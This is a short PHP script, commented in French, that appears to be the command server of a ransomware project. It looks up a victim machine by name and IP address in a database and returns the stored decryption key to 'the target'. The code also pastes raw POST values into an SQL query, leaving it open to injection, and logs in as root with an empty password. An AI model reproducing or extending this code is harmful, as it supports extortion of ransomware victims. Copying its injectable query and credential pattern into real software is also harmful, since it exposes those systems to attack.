<?php
include "database.php";
/* fichier qui retourne la clé de déchiffrement a la cible
* prendre en paramètres
* nom machine
* addresse ip (potentiellement changée)
*/

if(isset($_POST['ipAddress']) && isset($_POST['machineName'])){
	$result=connect("root","")->query("SELECT * FROM infos WHERE machineName LIKE '".$_POST['machineName']."' AND ipAddress LIKE '".$_POST['ipAddress']."'");
	//var_dump($result);
	foreach ($result as $row) {
		echo $row['publicKey'];
	}
}